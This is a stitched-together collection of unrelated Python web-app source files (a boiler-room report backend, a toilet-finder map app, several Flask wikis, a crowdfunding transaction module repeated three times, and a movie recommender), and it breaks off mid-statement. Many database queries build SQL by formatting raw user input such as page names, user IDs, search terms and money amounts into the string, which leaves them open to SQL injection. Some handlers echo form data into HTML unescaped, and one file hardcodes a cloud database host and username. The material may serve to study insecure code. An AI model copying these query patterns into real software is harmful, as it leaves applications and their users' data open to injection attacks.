	if not name in src:
		return None
	return src[name]

##
# Get a string representing the specified date.
#
def get_str_date(year, month, day):
	return libdate(year=year, month=month, day=day).strftime('%Y-%m-%d')

##
# Convert not existing and None values to '-' for html output.
#
def get_html_val(src, name):
	if not name in src or src[name] is None:
		return '-'
	return src[name]

##
# Get string representation of a float value useful for output to
# an user on a web page.
#
def get_html_float_to_str(src, name, precision=2):
	try:
		return ('{:.' + str(precision) + 'f}').format(float(src[name]))
	except:
		return '-'

##
# Insert the new report about the specified boiler room.
# @param tx        Current transaction.
# @param src       Dictionary with the boiler room attributes.
# @param room_id   Identifier of the boiler room - 'id' from
#                  'boiler_rooms' table.
# @param report_id Identifier of the report - 'id' from 'reports' table.
#
@tornado.gen.coroutine
def insert_boiler_room_report(tx, src, room_id, report_id):
	sql = 'INSERT INTO boiler_room_reports '\
	      'VALUES (NULL, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, '\
		       '%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, '\
		       '%s, %s, %s, %s, %s, %s)'
	assert(room_id)
	assert(report_id)
	global boiler_room_report_cols
	params = [room_id, report_id]
	for col in boiler_room_report_cols:
		params.append(get_safe_val(src, col))
	yield tx.execute(query=sql, params=params)

##
# Insert a report to the reports table. If some columns absense then replace
# them with NULL values.
#
@tornado.gen.coroutine
def insert_report(tx, src):
	sql = 'INSERT INTO reports VALUES (NULL, STR_TO_DATE(%s, %s), %s, %s, '\
	      '%s, %s, %s, STR_TO_DATE(%s, %s), %s, %s, %s, %s, %s, %s, %s)'
	params = (get_safe_val(src, 'date'),
		  '%d.%m.%Y',
		  get_safe_val(src, 'temp_average_air'),
		  get_safe_val(src, 'temp_average_water'),
		  get_safe_val(src, 'expected_temp_air_day'),
		  get_safe_val(src, 'expected_temp_air_night'),
		  get_safe_val(src, 'expected_temp_air_all_day'),
		  get_safe_val(src, 'forecast_date'),
		  '%d.%m.%Y',
		  get_safe_val(src, 'forecast_weather'),
		  get_safe_val(src, 'forecast_direction'),
		  get_safe_val(src, 'forecast_speed'),
		  get_safe_val(src, 'forecast_temp_day_from'),
		  get_safe_val(src, 'forecast_temp_day_to'),
		  get_safe_val(src, 'forecast_temp_night_from'),
		  get_safe_val(src, 'forecast_temp_night_to'))
	yield tx.execute(query=sql, params=params)

##
# Get all boiler room reports by the specified date, joined with corresponding
# district and boiler room names.
# @param tx   Current transaction.
# @param date Date by which need to find all reports.
#
# @retval Array of tuples.
#
@tornado.gen.coroutine
def get_full_report_by_date(tx, date):
	sql = 'SELECT * FROM reports WHERE date = STR_TO_DATE(%s, %s)'
	params = (date, '%Y-%m-%d')
	cursor = yield tx.execute(query=sql, params=params)
	report = cursor.fetchone()
	if not report:
		return None
	rep_id = report[0]
	sql = 'SELECT districts.name, boiler_rooms.name, {} '\
	      'FROM districts JOIN boiler_rooms '\
	      'ON(districts.id = boiler_rooms.district_id) '\
	      'JOIN boiler_room_reports '\
	      'ON (boiler_room_reports.boiler_room_id = '\
		  'boiler_rooms.id AND boiler_room_reports.report_id = {})'\
	      .format(",".join(boiler_room_report_cols), rep_id)
	cursor = yield tx.execute(sql)
	#
	# First, create a dictionary of the following format:
	#
	# {
	#     'district1': [room1, room2, ...],
	#     'district2': [room3, room4, ...],
	#     ....
	# }
	districts = {}
	next_row = cursor.fetchone()
	while next_row:
		dist_name = next_row[0]
		#
		# If it is first room for this district, then create a list
		# for it. Else - use existing.
		#
		if dist_name not in districts:
			districts[dist_name] = []
		rooms = districts[dist_name]
		next_report = {'name': next_row[1]}
		i = 2
		for col in boiler_room_report_cols:
			next_report[col] = next_row[i]
			i += 1
		rooms.append(next_report)
		next_row = cursor.fetchone()
	result = {}
	result['date'] = report[1]
	result['temp_average_air'] = report[2]
	result['temp_average_water'] = report[3]
	result['expected_temp_air_day'] = report[4]
	result['expected_temp_air_night'] = report[5]
	result['expected_temp_air_all_day'] = report[6]
	result['forecast_date'] = report[7]
	result['forecast_weather'] = report[8]
	result['forecast_direction'] = report[9]
	result['forecast_speed'] = report[10]
	result['forecast_temp_day_from'] = report[11]
	result['forecast_temp_day_to'] = report[12]
	result['forecast_temp_night_from'] = report[13]
	result['forecast_temp_night_to'] = report[14]
	result['districts'] = []
	for dist, rooms in sorted(districts.items(), key=lambda x: x[0]):
		district = {'name': dist}
		rooms[0]['district'] = dist
		for i in range(1, len(rooms)):
			rooms[i]['district'] = None
		district['rooms'] = rooms
		result['districts'].append(district)
	return result

##
# Get average values of all parameters for the specified month
# in all boiler rooms.
#
@tornado.gen.coroutine
def get_sum_reports_by_month(tx, year, month, cols):
	avg_list = list(['SUM({})'.format(col) for col in cols])
	sql = 'SELECT DAY(date), {} FROM reports JOIN boiler_room_reports '\
	      'ON(reports.id = report_id) WHERE MONTH(date) = %s and '\
	      'YEAR(date) = %s GROUP BY date;'.format(",".join(avg_list))
	params = (month, year)
	cursor = yield tx.execute(query=sql, params=params)
	data = cursor.fetchall()
	start_week, month_range = calendar.monthrange(year, month)
	res = {}
	for row in data:
		params = {}
		day = row[0]
		i = 1
		for col in cols:
			params[col] = row[i]
			i += 1
		res[day] = params
	return res

##
# Get a user by the specified email.
# @param tx    Current transaction.
# @param cols  String with columns separated by commas: 'id, name, ...'.
# @param email Email of the user.
#
# @retval Tuple with specified columns or the empty tuple.
#
@tornado.gen.coroutine
def get_user_by_email(tx, cols, email):
	sql = "SELECT {} FROM users WHERE email = %s".format(cols)
	params = (email)                    
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchone()

##
# Insert the user to the users table.
#
@tornado.gen.coroutine
def insert_user(tx, email, pass_hash):
	sql = "INSERT INTO users(email, pass_hash) VALUES (%s, %s)"
	params = (email, pass_hash)
	yield tx.execute(query=sql, params=params)

import asyncio, base64, bcrypt, time, string
from aiohttp import web
from cryptography import fernet
from aiohttp_session import setup as session_setup, get_session, session_middleware
from aiohttp_session.cookie_storage import EncryptedCookieStorage
from psycopg2 import IntegrityError
import database
import mazemap

HTML_base = """
<!doctype html>
<html>
<title>Toilet Finder</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

{text}

</html>
"""[1:-1]

#decorators:
def handle_html(func):
	#handle_html.timeout
	async def ret(*args, **kwargs):
		session = await get_session(args[0])
		
		if "uname" in session and "ignore_timeout" not in session:
			t = time.time()
			prev = session["visit_time"]
			if t - prev > handle_html.timeout: del session["uname"]
			session["visit_time"] = t
		else:
			session["visit_time"] = time.time()
		
		text = await func(*args, **kwargs)
		
		out = web.Response(
			content_type = "text/html",
			text = HTML_base.format(text=text)
		)
		
		return out
	return ret
def using_base(filename):
	with open(f"base/{filename}", "r") as f:
		base = f.read()
	def decorator(func):
		async def ret(request):
			out = await func(request, base)
			return out
		return ret
	return decorator
def require_login(func):
	async def ret(*args, **kwargs):
		session = await get_session(args[0])
		if "uname" not in session:
			session["return_after_login"] = args[0].path_qs
			return "You must be <a href=\"/login\">logged in</a> to access this page."
		out = await func(*args, **kwargs)
		return out
	return ret
def cache_page(func):#doesn't account for query parameters or different users
	cache = [None, 0]
	#cache_page.timeout
	async def ret(*args, **kwargs):
		if time.time() - cache[1] > cache_page.timeout:
			cache[0] = await func(*args, **kwargs)
			cache[1] = time.time()
		return cache[0]
	return ret

#index
@handle_html
@using_base("index.html")
@cache_page
async def GET_index(request, base):
	text = "\n".join((
		"<a href=\"/mapmaker\">/mapmaker</a><br/>",
		"<a href=\"/map\">/map</a><br/>",
		"<a href=\"/login\">/login</a><br/>",
		"<a href=\"/settings\">/settings</a><br/>",
		"<a href=\"/mazetest\">/mazetest</a><br/>",
		"<a href=\"http://disco.fleo.se/TEAM%2010%20FTW!!!\">Team 10 FTW</a>"
	))
	return base.format(text = text)


#login and registration
@handle_html
@using_base("loginform.html")
async def GET_login(request, base):
	session = await get_session(request)
	
	if "uname" not in session:
		return base
	else:
		return "<b>You're already logged in as <i>%s</i>!</b>\n<form action='/login' method='post'><input type='submit' name='action' value='logout'/></form>" % session["uname"]

@handle_html
async def POST_login(request):
	session = await get_session(request)
	data = await request.post()
	
	if set(["action", "uname", "psw"]).issubset(data.keys()) and "uname" not in session:
		uname = data["uname"]
		psw = data["psw"]
		
		if data["action"] == "login":
			
			entry = await database.select_user(request, uname)
			if not entry:
				return "Error: No such user."
			
			if bcrypt.hashpw(psw.encode("UTF-8"), entry[0][2].encode("UTF-8")).decode("UTF-8") != entry[0][2]:
				return "Error: Wrong password"
			
			session["uname"] = uname
			session["login_time"] = time.time()
			
			if "keep" in data and data["keep"] == "logged_in":
				session["ignore_timeout"] = True
			
			#success
			out = "Login successfull!"
			if "return_after_login" in session:
				out += f"<br/>\n<a href=\"{session['return_after_login']}\">Go back</a>"
				del session["return_after_login"]
			return out
		elif data["action"] == "register" and "psw2" in data:
			if not is_valid_username(uname):
				return f"Error: invalid username: <i>{uname}</i><br>\nWe only allow characters from the english alphabet plus digits"
			
			if psw != data["psw2"]:
				return "Error: mismatching passwords!"
			
			bhash = bcrypt.hashpw(psw.encode("UTF-8"), bcrypt.gensalt()).decode("UTF-8")
			
			try:
				await database.insert_user(request, uname, bhash)
			except IntegrityError:
				return "Error: username already taken!"
			
			return "User created! <a href=\"/login\">login over here.</a>"
	elif "action" in data:
		if data["action"] == "logout" and "uname" in session:
			for i in ("uname", "ignore_timeout"):
				if i in session:
					del session[i]
			return "Logged out"
			
			
	
	return f"Invalid login POST:<br/><i>{data.items()}</i><br>\nAlready logged in: {'uname' in session}"

#maps:
@handle_html
@using_base("mapmaker.html")
@cache_page
async def GET_mapmaker(request, base):
	tags = await database.select_tags(request)
	tag_checkboxes = "\n\t".join((f"<input type=\"checkbox\" name=\"tag\" value=\"{ID}\"> {label}<br>" for ID, label in tags))
	return base.format(tags=tag_checkboxes)

@handle_html
async def GET_map(request):
	#session = await get_session(request)
	tags = []
	mode = "all"
	for key, i in request.query.items():
		if key == "mode":
			mode = i
		elif key == "tag":
			tags.append(i)                    
	
	if not tags:
		toilets = await database.select_toilet_statuses(request)
	else:
		toilets = await database.select_toilet_statuses_by_tags(request, tags)
	
	red, blue = [], []
	for ID, lat, lng, name, status, dt in toilets:
		(blue if status else red).append((ID, lat, lng, name, None))
	
	out = "%s\n%s" % (
		mazemap.make_marker_chubs(red, color = "red") if mode == "all" else "",
		mazemap.make_marker_chubs(blue, color = "blue")
	)
	
	return mazemap.JS_skeleton.format(code = out)

#menus:
@handle_html
@require_login
@using_base("settings.html")
async def GET_settings(request, base):
	
	return base

@handle_html
@require_login
async def POST_settings(request):
	session = await get_session(request)
	data = await request.post()
	uname = session["uname"]
	
	if "action" in data:
		if data["action"] == "change_password":
			if set(["cpsw", "psw", "psw2"]).issubset(data.keys()):
				if data["psw"] != data["psw2"]:
					return "New passwords doesn't match!"
				
				#check if current password matches:
				entry = await database.select_user(request, uname)
				if not entry:
					return "Error: Logged in as non-existing user! (what?)"
				cpsw = data["cpsw"]
				if bcrypt.hashpw(cpsw.encode("UTF-8"), entry[0][2].encode("UTF-8")).decode("UTF-8") != entry[0][2]:
					return "Error: \"Current password\" was incorrect"
				
				#set new password
				psw = data["psw"]
				bhash = bcrypt.hashpw(psw.encode("UTF-8"), bcrypt.gensalt()).decode("UTF-8")
				await database.update_user_password(request, uname, bhash)
				
				return "Success! Your password has been changed!<br>\n<a href=\"/settings\">Click here to go back.</a>"
	
	
	return f"Invalid POST request: <i>{data.items()}</i>"


@handle_html
async def GET_test(request):
	#session = await get_session(request)
	out = await mazemap.test(request)
	return out

#=====================================================================
def is_valid_username(uname):
	for i in uname:
		if i not in string.ascii_letters and i not in string.digits:
			return False
	return True

def create_session_secret():
	fernet_key = fernet.Fernet.generate_key()
	return base64.urlsafe_b64decode(fernet_key)

def add_routes(app, secret_key):
	handle_html.timeout = app["ini"].getint("sessions", "session_idle_timeout")
	cache_page.timeout  = app["ini"].getint("sessions", "cached_page_timeout")
	
	#app.router.add_route('POST', '/pv/v1/', handle_v1)
	app.router.add_get('/',      GET_index)
	app.router.add_get('/index', GET_index)
	
	app.router.add_get ('/login', GET_login)
	app.router.add_post('/login', POST_login)
	
	app.router.add_get ('/settings', GET_settings)
	app.router.add_post('/settings', POST_settings)
	
	app.router.add_get('/mapmaker', GET_mapmaker)
	app.router.add_get('/map', GET_map)
	
	app.router.add_get('/mazetest', GET_test)
	
	app.router.add_static(
		'/static/',
		path='static',
		name='static'
	)
	
	session_setup(app, EncryptedCookieStorage(secret_key))

from flask import Flask, render_template, request, redirect, Markup
from wiki_linkify import wiki_linkify
import pg, markdown
from datetime import datetime
app = Flask("wiki")

db = pg.DB(dbname="wiki")
db.debug = True

@app.route("/")
def home_page():
    return redirect("/homepage")

@app.route("/<page_name>")
def place_holder(page_name):
    # Query database looking for existing information for the page called by the user
    query = db.query("select * from page where title = '%s'" % page_name).namedresult()                                        
    all_pages_query = db.query("select title from page order by title;").namedresult()
    print "\n\nAll pages query: %r\n\n" % all_pages_query
    # No information was found in the database for the page
    if len(query) == 0:
        return render_template(
            "placeholderpage.html",
            page_name = page_name,
            query = query,
            all_pages_query = all_pages_query
        )
    # Information was found in the database for the page
    else:
        query = query[0]
        print query
        # Query database looking for historical information for the page called by the user
        query_history = db.query("select * from page_history where page_id = '%s' order by version_number DESC;" % query.id).namedresult()
        print query_history
        page_content = query.page_content
        wiki_linkified_content = wiki_linkify(page_content)

        if len(query_history) > 0:
            return render_template(
                "placeholderpage.html",
                page_name = page_name,
                query = query,
                page_content = Markup(markdown.markdown(wiki_linkified_content)),
                query_history = query_history,
                all_pages_query = all_pages_query
            )
        else:
            return render_template(
                "placeholderpage.html",
                page_name = page_name,
                query = query,
                page_content = Markup(markdown.markdown(wiki_linkified_content)),
                all_pages_query = all_pages_query
            )

@app.route("/<page_name>/edit")
def edit_page(page_name):
    query = db.query("select * from page where title = '%s'" % page_name).namedresult()                                        
    if len(query) == 0:
        return render_template(
            "edit.html",
            page_name=page_name,
            query=query
        )
    else:
        return render_template(
            "edit.html",
            page_name=page_name,
            query=query[0]
        )

@app.route("/<page_name>/save", methods=["POST"])
def save_content(page_name):
    action = request.form.get("submit_button")

    if action == "update":
        query = db.query("select * from page where title = '%s'" % page_name)                    
        result_list = query.namedresult()
        print result_list
        result_list = result_list[0]
        print result_list
        db.insert(
            "page_history",
            title = page_name,
            page_content = result_list.page_content,
            author_name = result_list.author_name,
            last_mod_date = result_list.last_mod_date,
            page_id = result_list.id,
            version_number = result_list.version_number
        )

    current_time = datetime.now()
    last_mod_time = current_time.strftime('%Y/%m/%d %H:%M:%S')
    id = request.form.get("id")
    page_content = request.form.get("page_content")
    author_name = request.form.get("author_name")
    last_mod_date = request.form.get("last_mod_date")
    version_number = request.form.get("version_number")
    if action == "update":
        db.update(
            "page", {
                "id": id,
                "page_content": page_content,
                "author_name": author_name,
                "last_mod_date": last_mod_time,
                "version_number": int(version_number) + 1
            }
        )
    elif action == "create":
        db.insert (
            "page",
            title = page_name,
            page_content = page_content,
            author_name = author_name,
            last_mod_date = last_mod_time,
            version_number = 1
        )
    else:
        pass
    return redirect("/%s" % page_name)

@app.route("/AllPages")
def all_pages():
    all_pages_query = db.query("select title from page order by title;").namedresult()
    print "\n\nAll pages query: %r\n\n" % all_pages_query
    return render_template(
        "allpages.html",
        all_pages_query = all_pages_query
    )

@app.route("/search", methods = ["POST"])
def search_pages():
    search = request.form.get("search")
    page = db.query("select title from page where title = '%s'" % search).namedresult()                    
    if len(page) == 0:
        return redirect("/%s" % search)
    else:
        return place_holder(search)

if __name__ == "__main__":
    app.run(debug=True)

import datetime

import MySQLdb

from backend.SQLConnector import SQLConnector

TABLE_NAME = "transactions"


class Transaction:
    def __init__(self, project_id, user_id, money):
        self.project_id = project_id
        self.user_id = user_id
        self.money = money
        self.time = datetime.datetime.now().isoformat(' ')

    def to_json_obj(self):
        obj = {
            'id': self.id,
            'project_id': self.project_id,
            'user_id': self.user_id,
            'money': self.money,
            'time': self.time
            }
        return obj

    def to_database_query(self):
        data = [self.project_id, self.user_id, self.money, self.time]
        data = [repr(x) for x in data]
        labels = ["project_id", "user_id", "money", "timestamp"]
        return dict(zip(labels, data))


class TransactionConnector(SQLConnector):
    def __init__(self):
        SQLConnector.__init__(self)
        self.table_name = TABLE_NAME

    def insert_into(self, transaction):
        return SQLConnector.insert_into(self, transaction.to_database_query())

    def support_project(self, user_id, project_id, money):
        try:
            if self.can_user_pass_that_amount_of_money(user_id, money) \
                    and self.check_if_this_project_is_in_database(project_id):
                self.save_accepted_transaction(user_id, project_id, money)
                return True
            else:
                self.save_failure_transaction(user_id, project_id, money)
        except MySQLdb.Error:
            self.db.rollback()
        return False

    def save_accepted_transaction(self, user_id, project_id, money):
        self.cursor.execute("update users set money = money - %s where id = %s"%(money, user_id))                    
        self.cursor.execute("update projects set money = money + %s where id = %s" % (money, project_id))                    
        self.cursor.execute("insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )" % (project_id, user_id, money))                    
        self.db.commit()

    def save_failure_transaction(self, user_id, project_id, money):
        self.cursor.execute("insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )" % (project_id, user_id, money))                    
        self.db.commit()

    def check_if_this_project_is_in_database(self, project_id):
        self.cursor.execute("SELECT count(id) FROM projects where id = %s" % project_id)                    
        return self.cursor.fetchall()[0][0] == 1

    def can_user_pass_that_amount_of_money(self, user_id, money):
        self.cursor.execute("SELECT count(id) FROM kickstarter.users where id = %s and money >= %s" % (user_id, money))                    
        return self.cursor.fetchall()[0][0]

import datetime

import MySQLdb

from backend.SQLConnector import SQLConnector

TABLE_NAME = "transactions"


class Transaction:
    def __init__(self, project_id, user_id, money):
        self.project_id = project_id
        self.user_id = user_id
        self.money = money
        self.time = datetime.datetime.now().isoformat(' ')

    def to_json_obj(self):
        obj = {
            'id': self.id,
            'project_id': self.project_id,
            'user_id': self.user_id,
            'money': self.money,
            'time': self.time
            }
        return obj

    def to_database_query(self):
        data = [self.project_id, self.user_id, self.money, self.time]
        data = [repr(x) for x in data]
        labels = ["project_id", "user_id", "money", "timestamp"]
        return dict(zip(labels, data))


class TransactionConnector(SQLConnector):
    def __init__(self):
        SQLConnector.__init__(self)
        self.table_name = TABLE_NAME

    def insert_into(self, transaction):
        return SQLConnector.insert_into(self, transaction.to_database_query())

    def support_project(self, user_id, project_id, money):
        try:
            if self.can_user_pass_that_amount_of_money(user_id, money) \
                    and self.check_if_this_project_is_in_database(project_id):
                self.save_accepted_transaction(user_id, project_id, money)
                return True
            else:
                self.save_failure_transaction(user_id, project_id, money)
        except MySQLdb.Error:
            self.db.rollback()
        return False

    def save_accepted_transaction(self, user_id, project_id, money):
        self.cursor.execute("update users set money = money - %s where id = %s"%(money, user_id))                    
        self.cursor.execute("update projects set money = money + %s where id = %s" % (money, project_id))                    
        self.cursor.execute("insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )" % (project_id, user_id, money))                    
        self.db.commit()

    def save_failure_transaction(self, user_id, project_id, money):
        self.cursor.execute("insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )" % (project_id, user_id, money))                    
        self.db.commit()

    def check_if_this_project_is_in_database(self, project_id):
        self.cursor.execute("SELECT count(id) FROM projects where id = %s" % project_id)                    
        return self.cursor.fetchall()[0][0] == 1

    def can_user_pass_that_amount_of_money(self, user_id, money):
        self.cursor.execute("SELECT count(id) FROM kickstarter.users where id = %s and money >= %s" % (user_id, money))                    
        return self.cursor.fetchall()[0][0]

import datetime

import MySQLdb

from backend.SQLConnector import SQLConnector

TABLE_NAME = "transactions"


class Transaction:
    def __init__(self, project_id, user_id, money):
        self.project_id = project_id
        self.user_id = user_id
        self.money = money
        self.time = datetime.datetime.now().isoformat(' ')

    def to_json_obj(self):
        obj = {
            'id': self.id,
            'project_id': self.project_id,
            'user_id': self.user_id,
            'money': self.money,
            'time': self.time
            }
        return obj

    def to_database_query(self):
        data = [self.project_id, self.user_id, self.money, self.time]
        data = [repr(x) for x in data]
        labels = ["project_id", "user_id", "money", "timestamp"]
        return dict(zip(labels, data))


class TransactionConnector(SQLConnector):
    def __init__(self):
        SQLConnector.__init__(self)
        self.table_name = TABLE_NAME

    def insert_into(self, transaction):
        return SQLConnector.insert_into(self, transaction.to_database_query())

    def support_project(self, user_id, project_id, money):
        try:
            if self.can_user_pass_that_amount_of_money(user_id, money) \
                    and self.check_if_this_project_is_in_database(project_id):
                self.save_accepted_transaction(user_id, project_id, money)
                return True
            else:
                self.save_failure_transaction(user_id, project_id, money)
        except MySQLdb.Error:
            self.db.rollback()
        return False

    def save_accepted_transaction(self, user_id, project_id, money):
        self.cursor.execute("update users set money = money - %s where id = %s"%(money, user_id))                    
        self.cursor.execute("update projects set money = money + %s where id = %s" % (money, project_id))                    
        self.cursor.execute("insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )" % (project_id, user_id, money))                    
        self.db.commit()

    def save_failure_transaction(self, user_id, project_id, money):
        self.cursor.execute("insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )" % (project_id, user_id, money))                    
        self.db.commit()

    def check_if_this_project_is_in_database(self, project_id):
        self.cursor.execute("SELECT count(id) FROM projects where id = %s" % project_id)                    
        return self.cursor.fetchall()[0][0] == 1

    def can_user_pass_that_amount_of_money(self, user_id, money):
        self.cursor.execute("SELECT count(id) FROM kickstarter.users where id = %s and money >= %s" % (user_id, money))                    
        return self.cursor.fetchall()[0][0]

from flask import Flask
from flask import request
from flask import Response
from recsys.algorithm.factorize import SVD
from pymemcache.client.hash import HashClient
import elasticache_auto_discovery
import pymysql
import logging
import hashlib
import time
import json
import sys

rds_host  = "recommendationdata.cnrjbhnycdir.eu-west-1.rds.amazonaws.com"
name = "blautj1"
password = "******"
db_name = "recommendationDB"

elasticache_config_endpoint = "reco-cache.chsu5z.cfg.euw1.cache.amazonaws.com:11211"
nodes = elasticache_auto_discovery.discover(elasticache_config_endpoint)
print nodes
nodes = map(lambda x: (x[1], int(x[2])), nodes)
print nodes
memcache_client = HashClient(nodes)
print memcache_client

try:
    conn = pymysql.connect(rds_host, user=name, passwd=password, db=db_name, connect_timeout=5)
except:
    sys.exit()

separator = '::'
app = Flask(__name__)

@app.route('/data')
def query():
    user = request.args.get('user_id')
    processedRow = ''
    hash_ids = []
    item_count = 0
    
    with conn.cursor() as cur:
        query = "SELECT movie_id, rating FROM recommendationDB.user_ratings WHERE user_id=" + user                    
        print query
        cur.execute(query)                    
        for row in cur:
            item_count += 1
            processedRow = processedRow + str(user) + separator + str(row[0]) + separator + str(row[1]) + separator + str(int(time.time())) + "\r\n"
            hash_ids.append(str(row[0]))
        print processedRow
        text_file = open("ratings.dat", "a")                    
        text_file.write(processedRow)                    
        text_file.close()
    
    print hash_ids                    
    hash = hashlib.sha1('.'.join(hash_ids)).hexdigest()                    
    print(hash)

    cache = memcache_client.get(hash)
    print cache
    if cache != None:    
        return Response(response=json.dumps({"results":json.loads(cache)}),
                        status=200,
                        mimetype="application/json")                    
    else:
        svd = SVD()
        svd.load_data(filename='./ratings.dat',                    
        sep=separator,
        format={'col':0, 'row':1, 'value':2, 'ids': int})

        recommendations = svd.recommend(int(user), is_row=False)
        recommendations_dict = dict(recommendations)

        films = "movie_id=" + str(recommendations.pop(0)[0])
        for recommendation in recommendations:
            films = films + " OR movie_id=" + str(recommendation[0])

        film_titles = []
        with conn.cursor() as cur:
            query = "SELECT movie_id, movie_title, movie_genre FROM recommendationDB.movies WHERE " + films                     
            print query
            cur.execute(query)                    
            for row in cur:
                item_count += 1
                film_titles.append({"title": row[1],"genre": row[2], "relevance": recommendations_dict[row[0]], "movie_id": row[0]})

        memcache_client.set(hash, json.dumps(film_titles))

        return Response(response=json.dumps({"results":film_titles}),
                        status=200,
                        mimetype="application/json")                    

from flask import Flask, render_template, redirect, request
import pg, markdown, time
from time import strftime, localtime
import pg, markdown, time
from wiki_linkify import wiki_linkify

app = Flask('WikiApp')

db = pg.DB(dbname='wiki_db_redo')

@app.route('/')
def render_homepage():
    return render_template(
        'homepage.html'
    )

@app.route('/<page_name>')
def render_page_name(page_name):
    query = db.query("select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)                    
    wiki_page = query.namedresult()
    has_content = False
    page_is_taken = False
    if len(wiki_page) < 1:
        content = ""
    else:
        page_is_taken = True
        content = wiki_page[0].content
    if len(content) > 0:
        has_content = True
    else:
        pass
    content = markdown.markdown(wiki_linkify(content))
    return render_template(
        'pageholder.html',
        page_is_taken = page_is_taken,
        page_name = page_name,
        markdown = markdown,
        wiki_linkify = wiki_linkify,
        has_content = has_content,
        content = content
    )

@app.route('/<page_name>/edit')
def render_page_edit(page_name):
    query = db.query("select page_content.content from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)                    
    wiki_page = query.namedresult()
    if len(wiki_page) > 0:
        content = wiki_page[0].content
    else:
        content = ""
    return render_template(
        'edit_page.html',
        page_name = page_name,
        content = content
    )

@app.route('/<page_name>/save', methods=['POST'])
def save_page_edit(page_name):
    # grab the new content from the user
    content = request.form.get('content')
    # check if 'page_name' exists in the database
    query = db.query("select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)                    
    result = query.namedresult()
    # if it doesn't exist, create a new page in the database
    if len(result) < 1:
        db.insert(
            'page', {
                'page_name': page_name
            }
        )
    else:
        pass
    # now that we're certain that the page exists in the database, we again grab the query
    # and insert new content in the database
    query = db.query("select id from page where page_name = '%s'" % page_name)
    page_id = query.namedresult()[0].id
    db.insert(
        'page_content', {
            'page_id': page_id,
            'content': content,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S", localtime())
        }
    )
    return redirect("/%s" % page_name)

@app.route('/search', methods=['POST'])
def redirect_search():
    search = request.form.get('search')
    return redirect('/%s' % search)

@app.route('/<page_name>/history')
def view_page_history(page_name):
    query = db.query("select page_content.timestamp, page_content.id from page, page_content where page.id = page_content.page_id and page.page_name = '%s'" % page_name)                    
    page_histories = query.namedresult()

    return render_template(
        'page_history.html',
        page_name = page_name,
        page_histories = page_histories
    )

@app.route('/<page_name>/history/record')
def view_page_record(page_name):
    content_id = request.args.get('id')
    query = db.query("select page_content.content, page_content.timestamp from page, page_content where page.id = page_content.page_id and page_content.id = '%s'" % content_id)                    
    page_record = query.namedresult()[0]

    return render_template(
        'page_record.html',
        page_name = page_name,
        page_record = page_record
    )

if __name__ == '__main__':
    app.run(debug=True)

from flask import Flask, render_template, redirect, request
import pg, markdown, time
from time import strftime, localtime
import pg, markdown, time
from wiki_linkify import wiki_linkify

app = Flask('WikiApp')

db = pg.DB(dbname='wiki_db_redo')

@app.route('/')
def render_homepage():
    return render_template(
        'homepage.html'
    )

@app.route('/<page_name>')
def render_page_name(page_name):
    query = db.query("select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)
    wiki_page = query.namedresult()
    has_content = False
    page_is_taken = False
    if len(wiki_page) < 1:
        content = ""
    else:
        page_is_taken = True
        content = wiki_page[0].content
    if len(content) > 0:
        has_content = True
    else:
        pass
    content = markdown.markdown(wiki_linkify(content))
    return render_template(
        'pageholder.html',
        page_is_taken = page_is_taken,
        page_name = page_name,
        markdown = markdown,
        wiki_linkify = wiki_linkify,
        has_content = has_content,
        content = content
    )

@app.route('/<page_name>/edit')
def render_page_edit(page_name):
    query = db.query("select page_content.content from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)
    wiki_page = query.namedresult()
    if len(wiki_page) > 0:
        content = wiki_page[0].content
    else:
        content = ""
    return render_template(
        'edit_page.html',
        page_name = page_name,
        content = content
    )

@app.route('/<page_name>/save', methods=['POST'])
def save_page_edit(page_name):
    # grab the new content from the user
    content = request.form.get('content')
    # check if 'page_name' exists in the database
    query = db.query("select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1" % page_name)
    result = query.namedresult()
    # if it doesn't exist, create a new page in the database
    if len(result) < 1:
        db.insert(
            'page', {
                'page_name': page_name
            }
        )
    else:
        pass
    # now that we're certain that the page exists in the database, we again grab the query
    # and insert new content in the database
    query = db.query("select id from page where page_name = '%s'" % page_name)                    
    page_id = query.namedresult()[0].id
    db.insert(
        'page_content', {
            'page_id': page_id,
            'content': content,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S", localtime())
        }
    )
    return redirect("/%s" % page_name)                    

@app.route('/search', methods=['POST'])
def redirect_search():
    search = request.form.get('search')
    return redirect('/%s' % search)                    

@app.route('/<page_name>/history')
def view_page_history(page_name):
    query = db.query("select page_content.timestamp, page_content.id from page, page_content where page.id = page_content.page_id and page.page_name = '%s'" % page_name)
    page_histories = query.namedresult()

    return render_template(
        'page_history.html',
        page_name = page_name,
        page_histories = page_histories
    )

@app.route('/<page_name>/history/record')
def view_page_record(page_name):
    content_id = request.args.get('id')
    query = db.query("select page_content.content, page_content.timestamp from page, page_content where page.id = page_content.page_id and page_content.id = '%s'" % content_id)
    page_record = query.namedresult()[0]

    return render_template(
        'page_record.html',
        page_name = page_name,
        page_record = page_record
    )

if __name__ == '__main__':
    app.run(debug=True)

import sqlite3
from Client import Client
import create_database


class SqlManager:
    def __init__(self, conn):
        self.__conn = conn

    def change_message(self, new_message, logged_user):
        update_sql = """
            UPDATE Clients
            SET message = '{}'                    
